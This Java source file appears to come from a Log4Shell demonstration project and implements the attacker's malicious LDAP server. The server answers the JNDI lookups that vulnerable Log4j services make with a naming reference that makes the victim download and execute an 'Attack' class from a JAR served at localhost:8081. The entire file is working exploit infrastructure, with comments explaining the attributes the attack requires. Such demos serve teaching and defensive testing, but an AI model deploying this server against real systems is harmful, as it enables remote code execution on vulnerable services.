package de.apwolf.log4shell.attacker;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.UnknownHostException;

/**
 * This LDAP server will be receiving the JNDI lookup call from the victim service and return the download link for
 * the JAR containing the class the victim service looks for
 */
public class AttackerLdapServer {

    private static final Logger LOGGER = LogManager.getLogger();

    private static final int PORT = 1389; // port where the LDAP server will be running

    private static final String ATTACK_URL = "http://localhost:8081/Attack.jar"; // URL where the JAR can be downloaded

    private static final String ATTACK_CLASS = "Attack"; // Name of the class file you want to deliver

    public void start() throws LDAPException, UnknownHostException {
        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=apwolf,dc=de");
        config.setListenerConfigs(new InMemoryListenerConfig(
                "listen",
                InetAddress.getByName("0.0.0.0"),
                PORT,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));

        config.addInMemoryOperationInterceptor(new AttackInterceptor());
        new InMemoryDirectoryServer(config).startListening();
        LOGGER.info("Started Attacker LDAP Server on localhost:" + PORT);
    }

    private static class AttackInterceptor extends InMemoryOperationInterceptor {

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            try {
                sendResult(result, result.getRequest().getBaseDN(), new Entry(base));
            } catch (LDAPException exception) {
                LOGGER.error(exception);
            }

        }

        private void sendResult(InMemoryInterceptedSearchResult result, String base, Entry entry) throws LDAPException {
            LOGGER.info("Redirecting call for " + base + " to " + ATTACK_URL);
            entry.addAttribute("javaClassName", ATTACK_CLASS); // must be the class name without .class
            entry.addAttribute("javaCodeBase", "http://localhost:8081"); // must be the URL where the JAR is found
            entry.addAttribute("objectClass", "javaNamingReference"); // must be this value
            entry.addAttribute("javaFactory", ATTACK_CLASS); // must be the class name without .class

            result.sendSearchEntry(entry);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }
}